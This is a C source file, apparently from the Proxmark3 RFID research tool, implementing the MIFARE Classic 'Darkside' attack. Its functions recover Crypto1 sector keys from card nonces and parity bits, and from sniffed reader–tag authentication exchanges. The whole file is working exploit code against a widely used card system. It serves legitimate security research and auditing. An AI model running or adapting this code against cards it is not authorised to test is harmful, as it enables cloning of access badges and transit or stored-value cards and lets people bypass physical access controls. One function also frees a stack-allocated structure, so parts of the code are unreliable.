//-----------------------------------------------------------------------------
// Merlok - June 2011
// Roel - Dec 2009
// Unknown author
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// MIFARE Darkside hack
//-----------------------------------------------------------------------------

#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#define llx PRIx64

#include "nonce2key.h"
#include "mifarehost.h"
#include "ui.h"

int compar_state(const void * a, const void * b) {
	// didn't work: (the result is truncated to 32 bits)
	//return (*(int64_t*)b - *(int64_t*)a);

	// better:
	if (*(int64_t*)b == *(int64_t*)a) return 0;
	else if (*(int64_t*)b > *(int64_t*)a) return 1;
	else return -1;
}

int nonce2key(uint32_t uid, uint32_t nt, uint32_t nr, uint64_t par_info, uint64_t ks_info, uint64_t * key) {
  struct Crypto1State *state;
  uint32_t i, pos, rr, nr_diff, key_count;//, ks1, ks2;
  byte_t bt, ks3x[8], par[8][8];
  uint64_t key_recovered;
  int64_t *state_s;
  static uint32_t last_uid;
  static int64_t *last_keylist;
  rr = 0;
  
  if (last_uid != uid && last_keylist != NULL)
  {
	free(last_keylist);
	last_keylist = NULL;
  }
  last_uid = uid;

  // Reset the last three significant bits of the reader nonce
  nr &= 0xffffff1f;
  
  PrintAndLog("\nuid(%08x) nt(%08x) par(%016"llx") ks(%016"llx") nr(%08"llx")\n\n",uid,nt,par_info,ks_info,nr);

  for (pos=0; pos<8; pos++)
  {
    ks3x[7-pos] = (ks_info >> (pos*8)) & 0x0f;
    bt = (par_info >> (pos*8)) & 0xff;
    for (i=0; i<8; i++)
    {
      par[7-pos][i] = (bt >> i) & 0x01;
    }
  }

  printf("|diff|{nr}    |ks3|ks3^5|parity         |\n");
  printf("+----+--------+---+-----+---------------+\n");
  for (i=0; i<8; i++)
  {
    nr_diff = nr | i << 5;
    printf("| %02x |%08x|",i << 5, nr_diff);
    printf(" %01x |  %01x  |",ks3x[i], ks3x[i]^5);
    for (pos=0; pos<7; pos++) printf("%01x,", par[i][pos]);
    printf("%01x|\n", par[i][7]);
  }
  
	if (par_info==0)
		PrintAndLog("parity is all zero,try special attack!just wait for few more seconds...");
  
	state = lfsr_common_prefix(nr, rr, ks3x, par, par_info==0);
	state_s = (int64_t*)state;
	
	//char filename[50] ;
    //sprintf(filename, "nt_%08x_%d.txt", nt, nr);
    //printf("name %s\n", filename);
	//FILE* fp = fopen(filename,"w");
	for (i = 0; (state) && ((state + i)->odd != -1); i++)
	{
		lfsr_rollback_word(state+i, uid^nt, 0);
		crypto1_get_lfsr(state + i, &key_recovered);
		*(state_s + i) = key_recovered;
		//fprintf(fp, "%012llx\n",key_recovered);
	}
	//fclose(fp);
	
	if(!state)
		return 1;
	
	qsort(state_s, i, sizeof(*state_s), compar_state);
	*(state_s + i) = -1;
	
	//Create the intersection:
	if (par_info == 0 )
		if ( last_keylist != NULL)
		{
			int64_t *p1, *p2, *p3;
			p1 = p3 = last_keylist; 
			p2 = state_s;
			while ( *p1 != -1 && *p2 != -1 ) {
				if (compar_state(p1, p2) == 0) {
					printf("p1:%"llx" p2:%"llx" p3:%"llx" key:%012"llx"\n",(uint64_t)(p1-last_keylist),(uint64_t)(p2-state_s),(uint64_t)(p3-last_keylist),*p1);
					*p3++ = *p1++;
					p2++;
				}
				else {
					while (compar_state(p1, p2) == -1) ++p1;
					while (compar_state(p1, p2) == 1) ++p2;
				}
			}
			key_count = p3 - last_keylist;;
		}
		else
			key_count = 0;
	else
	{
		last_keylist = state_s;
		key_count = i;
	}
	
	printf("key_count:%d\n", key_count);

	// The list may still contain several key candidates. Test each of them with mfCheckKeys
	for (i = 0; i < key_count; i++) {
		uint8_t keyBlock[6];
		uint64_t key64;
		key64 = *(last_keylist + i);
		num_to_bytes(key64, 6, keyBlock);
		key64 = 0;
		if (!mfCheckKeys(0, 0, 1, keyBlock, &key64)) {
			*key = key64;
			free(last_keylist);
			last_keylist = NULL;
			if (par_info ==0)
				free(state);
			return 0;
		}
	}	

	
	free(last_keylist);
	last_keylist = state_s;
	
	return 1;
}

int tryMfk32(uint64_t myuid, uint8_t *data, uint8_t *outputkey ){

	struct Crypto1State *s,*t;
	uint64_t key;     // recovered key
	uint32_t uid;     // serial number
	uint32_t nt;      // tag challenge
	uint32_t nr0_enc; // first encrypted reader challenge
	uint32_t ar0_enc; // first encrypted reader response
	uint32_t nr1_enc; // second encrypted reader challenge
	uint32_t ar1_enc; // second encrypted reader response	
	bool isSuccess = FALSE;
	int counter = 0;
	
	uid 	= myuid;//(uint32_t)bytes_to_num(data +  0, 4);
	nt 		= *(uint32_t*)(data+8);
	nr0_enc = *(uint32_t*)(data+12);
	ar0_enc = *(uint32_t*)(data+16);
	nr1_enc = *(uint32_t*)(data+32);
	ar1_enc = *(uint32_t*)(data+36);

	// PrintAndLog("recovering key for:");
	// PrintAndLog("    uid: %08x   %08x",uid, myuid);
	// PrintAndLog("     nt: %08x",nt);
	// PrintAndLog(" {nr_0}: %08x",nr0_enc);
	// PrintAndLog(" {ar_0}: %08x",ar0_enc);
	// PrintAndLog(" {nr_1}: %08x",nr1_enc);
	// PrintAndLog(" {ar_1}: %08x",ar1_enc);

	s = lfsr_recovery32(ar0_enc ^ prng_successor(nt, 64), 0);
  
	for(t = s; t->odd | t->even; ++t) {
		lfsr_rollback_word(t, 0, 0);
		lfsr_rollback_word(t, nr0_enc, 1);
		lfsr_rollback_word(t, uid ^ nt, 0);
		crypto1_get_lfsr(t, &key);
		crypto1_word(t, uid ^ nt, 0);
		crypto1_word(t, nr1_enc, 1);
		if (ar1_enc == (crypto1_word(t, 0, 0) ^ prng_successor(nt, 64))) {
			PrintAndLog("Found Key: [%012"llx"]",key);
			isSuccess = TRUE;
			++counter;
			if (counter==20)
				break;
		}
	}
	free(s);
	return isSuccess;
}

int tryMfk64(uint64_t myuid, uint8_t *data, uint8_t *outputkey ){

	struct Crypto1State *revstate;
	uint64_t key;     // recovered key
	uint32_t uid;     // serial number
	uint32_t nt;      // tag challenge
	uint32_t nr_enc;  // encrypted reader challenge
	uint32_t ar_enc;  // encrypted reader response
	uint32_t at_enc;  // encrypted tag response
	uint32_t ks2;     // keystream used to encrypt reader response
	uint32_t ks3;     // keystream used to encrypt tag response

	struct Crypto1State mpcs = {0, 0};
	struct Crypto1State *pcs;
	pcs = &mpcs;
	
	uid 	= myuid;//(uint32_t)bytes_to_num(data +  0, 4);
	nt 		= *(uint32_t*)(data+8);
	nr_enc = *(uint32_t*)(data+12);
	ar_enc = *(uint32_t*)(data+16);
	
	crypto1_word(pcs, nr_enc , 1);
	at_enc = prng_successor(nt, 96) ^ crypto1_word(pcs, 0, 0);

	// printf("Recovering key for:\n");
	// printf("  uid: %08x\n",uid);
	// printf("   nt: %08x\n",nt);
	// printf(" {nr}: %08x\n",nr_enc);
	// printf(" {ar}: %08x\n",ar_enc);
	// printf(" {at}: %08x\n",at_enc);

	// Extract the keystream from the messages
	ks2 = ar_enc ^ prng_successor(nt, 64);
	ks3 = at_enc ^ prng_successor(nt, 96);

	revstate = lfsr_recovery64(ks2, ks3);
	lfsr_rollback_word(revstate, 0, 0);
	lfsr_rollback_word(revstate, 0, 0);
	lfsr_rollback_word(revstate, nr_enc, 1);
	lfsr_rollback_word(revstate, uid ^ nt, 0);
	crypto1_get_lfsr(revstate, &key);
	PrintAndLog("Found Key: [%012"llx"]",key);
	crypto1_destroy(revstate);
	crypto1_destroy(pcs);
	return 0;
}
